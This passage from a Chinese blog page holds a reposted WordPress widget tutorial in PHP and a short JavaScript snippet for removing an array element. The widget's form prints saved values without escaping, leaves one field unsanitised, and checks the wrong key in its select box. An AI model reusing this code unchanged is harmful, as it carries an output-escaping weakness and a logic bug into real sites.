* Author: Justin Tadlock</span></span><br><span class="line"><span class="comment"> * Author URI: http://justintadlock.com</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment"> * but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment"> * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Add function to widgets_init that'll load our widget.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 0.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">add_action( <span class="string">'widgets_init'</span>, <span class="string">'example_load_widgets'</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Register our widget.</span></span><br><span class="line"><span class="comment"> * 'Example_Widget' is the widget class used below.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 0.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">example_load_widgets</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    register_widget( <span class="string">'Example_Widget'</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Example Widget class.</span></span><br><span class="line"><span class="comment"> * This class handles everything that needs to be handled with the widget:</span></span><br><span class="line"><span class="comment"> * the settings, form, display, and update.  Nice!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 0.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example_Widget</span> <span class="keyword">extends</span> <span class="title">WP_Widget</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Widget setup.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Example_Widget</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* Widget settings. */</span></span><br><span class="line">        $widget_ops = <span class="keyword">array</span>( <span class="string">'classname'</span> =&gt; <span class="string">'example'</span>, <span class="string">'description'</span> =&gt; __(<span class="string">'An example widget that displays a person\'s name and sex.'</span>, <span class="string">'example'</span>) );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Widget control settings. */</span></span><br><span class="line">        $control_ops = <span class="keyword">array</span>( <span class="string">'width'</span> =&gt; <span class="number">300</span>, <span class="string">'height'</span> =&gt; <span class="number">350</span>, <span class="string">'id_base'</span> =&gt; <span class="string">'example-widget'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Create the widget. */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;WP_Widget( <span class="string">'example-widget'</span>, __(<span class="string">'Example Widget'</span>, <span class="string">'example'</span>), $widget_ops, $control_ops );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * How to display the widget on the screen.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">widget</span><span class="params">( $args, $instance )</span> </span>&#123;</span><br><span class="line">        extract( $args );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Our variables from the widget settings. */</span></span><br><span class="line">        $title = apply_filters(<span class="string">'widget_title'</span>, $instance[<span class="string">'title'</span>] );</span><br><span class="line">        $name = $instance[<span class="string">'name'</span>];</span><br><span class="line">        $sex = $instance[<span class="string">'sex'</span>];</span><br><span class="line">        $show_sex = <span class="keyword">isset</span>( $instance[<span class="string">'show_sex'</span>] ) ? $instance[<span class="string">'show_sex'</span>] : <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Before widget (defined by themes). */</span></span><br><span class="line">        <span class="keyword">echo</span> $before_widget;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Display the widget title if one was input (before and after defined by themes). */</span></span><br><span class="line">        <span class="keyword">if</span> ( $title )</span><br><span class="line">            <span class="keyword">echo</span> $before_title . $title . $after_title;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Display name from widget settings if one was input. */</span></span><br><span class="line">        <span class="keyword">if</span> ( $name )</span><br><span class="line">            printf( <span class="string">'&lt;p&gt;'</span> . __(<span class="string">'Hello. My name is %1$s.'</span>, <span class="string">'example'</span>) . <span class="string">'&lt;/p&gt;'</span>, $name );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If show sex was selected, display the user's sex. */</span></span><br><span class="line">        <span class="keyword">if</span> ( $show_sex )</span><br><span class="line">            printf( <span class="string">'&lt;p&gt;'</span> . __(<span class="string">'I am a %1$s.'</span>, <span class="string">'example.'</span>) . <span class="string">'&lt;/p&gt;'</span>, $sex );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* After widget (defined by themes). */</span></span><br><span class="line">        <span class="keyword">echo</span> $after_widget;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Update the widget settings.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">( $new_instance, $old_instance )</span> </span>&#123;</span><br><span class="line">        $instance = $old_instance;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Strip tags for title and name to remove HTML (important for text inputs). */</span></span><br><span class="line">        $instance[<span class="string">'title'</span>] = strip_tags( $new_instance[<span class="string">'title'</span>] );</span><br><span class="line">        $instance[<span class="string">'name'</span>] = strip_tags( $new_instance[<span class="string">'name'</span>] );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* No need to strip tags for sex and show_sex. */</span></span><br><span class="line">        $instance[<span class="string">'sex'</span>] = $new_instance[<span class="string">'sex'</span>];</span><br><span class="line">        $instance[<span class="string">'show_sex'</span>] = $new_instance[<span class="string">'show_sex'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Displays the widget settings controls on the widget panel.</span></span><br><span class="line"><span class="comment">     * Make use of the get_field_id() and get_field_name() function</span></span><br><span class="line"><span class="comment">     * when creating your form elements. This handles the confusing stuff.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">form</span><span class="params">( $instance )</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Set up some default widget settings. */</span></span><br><span class="line">        $defaults = <span class="keyword">array</span>( <span class="string">'title'</span> =&gt; __(<span class="string">'Example'</span>, <span class="string">'example'</span>), <span class="string">'name'</span> =&gt; __(<span class="string">'John Doe'</span>, <span class="string">'example'</span>), <span class="string">'sex'</span> =&gt; <span class="string">'male'</span>, <span class="string">'show_sex'</span> =&gt; <span class="keyword">true</span> );</span><br><span class="line">        $instance = wp_parse_args( (<span class="keyword">array</span>) $instance, $defaults ); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">        &lt;!-- Widget Title: Text Input --&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">            &lt;label <span class="keyword">for</span>=<span class="string">"&lt;?php echo $this-&gt;get_field_id( 'title' ); ?&gt;"</span>&gt;<span class="meta">&lt;?php</span> _e(<span class="string">'Title:'</span>, <span class="string">'hybrid'</span>); <span class="meta">?&gt;</span>&lt;/label&gt;</span><br><span class="line">            &lt;input id=<span class="string">"&lt;?php echo $this-&gt;get_field_id( 'title' ); ?&gt;"</span> name=<span class="string">"&lt;?php echo $this-&gt;get_field_name( 'title' ); ?&gt;"</span> value=<span class="string">"&lt;?php echo $instance['title']; ?&gt;"</span> style=<span class="string">"width:100%;"</span> /&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- Your Name: Text Input --&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">            &lt;label <span class="keyword">for</span>=<span class="string">"&lt;?php echo $this-&gt;get_field_id( 'name' ); ?&gt;"</span>&gt;<span class="meta">&lt;?php</span> _e(<span class="string">'Your Name:'</span>, <span class="string">'example'</span>); <span class="meta">?&gt;</span>&lt;/label&gt;</span><br><span class="line">            &lt;input id=<span class="string">"&lt;?php echo $this-&gt;get_field_id( 'name' ); ?&gt;"</span> name=<span class="string">"&lt;?php echo $this-&gt;get_field_name( 'name' ); ?&gt;"</span> value=<span class="string">"&lt;?php echo $instance['name']; ?&gt;"</span> style=<span class="string">"width:100%;"</span> /&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- Sex: Select Box --&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">            &lt;label <span class="keyword">for</span>=<span class="string">"&lt;?php echo $this-&gt;get_field_id( 'sex' ); ?&gt;"</span>&gt;<span class="meta">&lt;?php</span> _e(<span class="string">'Sex:'</span>, <span class="string">'example'</span>); <span class="meta">?&gt;</span>&lt;/label&gt; </span><br><span class="line">            &lt;select id="&lt;?php echo $this-&gt;get_field_id( 'sex' ); ?&gt;" name="&lt;?php echo $this-&gt;get_field_name( 'sex' ); ?&gt;" class="widefat" style="width:100%;"&gt;</span><br><span class="line">                &lt;option <span class="meta">&lt;?php</span> <span class="keyword">if</span> ( <span class="string">'male'</span> == $instance[<span class="string">'format'</span>] ) <span class="keyword">echo</span> <span class="string">'selected="selected"'</span>; <span class="meta">?&gt;</span>&gt;male&lt;/option&gt;</span><br><span class="line">                &lt;option <span class="meta">&lt;?php</span> <span class="keyword">if</span> ( <span class="string">'female'</span> == $instance[<span class="string">'format'</span>] ) <span class="keyword">echo</span> <span class="string">'selected="selected"'</span>; <span class="meta">?&gt;</span>&gt;female&lt;/option&gt;</span><br><span class="line">            &lt;/select&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- Show Sex? Checkbox --&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">            &lt;input class="checkbox" type="checkbox" &lt;?php checked( $instance['show_sex'], true ); ?&gt; id="&lt;?php echo $this-&gt;get_field_id( 'show_sex' ); ?&gt;" name="&lt;?php echo $this-&gt;get_field_name( 'show_sex' ); ?&gt;" /&gt; </span><br><span class="line">            &lt;label <span class="keyword">for</span>=<span class="string">"&lt;?php echo $this-&gt;get_field_id( 'show_sex' ); ?&gt;"</span>&gt;<span class="meta">&lt;?php</span> _e(<span class="string">'Display sex publicly?'</span>, <span class="string">'example'</span>); <span class="meta">?&gt;</span>&lt;/label&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>转载自：<a href="http://summerbluet.com/225" target="_blank" rel="noopener">http://summerbluet.com/225</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/Web-开发/">Web 开发</a>
    </span>
    

    

    </div>

    
    <div class="article-meta pull-right">
      <span>
        <i class="icon-comments"></i>
        <span>
          <a href="/2015/11/04/WordPress 插件开发实例 – 详细注释的 Widget 开发例子/#comment">评论</a>
        </span>
      </span>
    </div>
    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/11/02/Js数组里删除指定的元素（不是指定的位置）/"><span>Js数组里删除指定的元素（不是指定的位置）</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/11/02/Js数组里删除指定的元素（不是指定的位置）/" rel="bookmark">
        <time class="entry-date published" datetime="2015-11-02T05:34:04.000Z">
          2015-11-02
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>之前一直是做后端的，从来也没有写过js，但是却一直想学学，也只是基于兴趣而已！现在到了这个公司，确实大量的写js。但也一直都是没有系统的去看过js！都是搞什么查什么！<br>最近要解决一个问题，但是用到了js的数组，知道了元素要去删除这个数组中的这个指定的元素。网上找到了一些解决办法，在这里做个笔记记下来：<br>首先可以给js的数组对象定义一个函数，用于查找指定的元素在数组中的位置，即索引，代码为：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.indexOf = <span class="function"><span class="keyword">function</span>(<span class="params">val</span>) </span>&#123;              </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.length; i++) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>[i] == val) <span class="keyword">return</span> i;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>然后使用通过得到这个元素的索引，使用js数组自己固有的函数去删除这个元素：<br>代码为：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.remove = <span class="function"><span class="keyword">function</span>(<span class="params">val</span>) </span>&#123;  </span><br><span class="line">    <span class="keyword">var</span> index = <span class="keyword">this</span>.indexOf(val);  </span><br><span class="line">    <span class="keyword">if</span> (index &gt; <span class="number">-1</span>) &#123;  </span><br><span class="line">        <span class="keyword">this</span>.splice(index, <span class="number">1</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>这样就构造了这样一个函数，比如我有有一个数组：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> emp = [<span class="string">'abs'</span>,<span class="string">'dsf'</span>,<span class="string">'sdf'</span>,<span class="string">'fd'</span>];</span><br></pre></td></tr></table></figure></p>
<p>假如我们要删除其中的fd,就可以使用:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emp.remove(<span class="string">'fd'</span>);</span><br></pre></td></tr></table></figure></p>
<p>转载自 <a href="http://my.oschina.net/zh119893/blog/265964" target="_blank" rel="noopener">http://my.oschina.net/zh119893/blog/265964</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/Web-开发/">Web 开发</a>
    </span>
    

    

    </div>

    
    <div class="article-meta pull-right">
      <span>
        <i class="icon-comments"></i>
        <span>
          <a href="/2015/11/02/Js数组里删除指定的元素（不是指定的位置）/#comment">评论</a>
        </span>
      </span>
    </div>
    
  </div>
</article>




<nav class="pagination">
  
  <a href="/page/4/" class="pagination-prev">上一页</a>
  
  
  <a href="/page/6/" class="pagination-next">下一页</a>
  
</nav>
    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2018 403 Forbidden
    
  </p>
</footer>
    
  </div>
</div>
</body>
</html>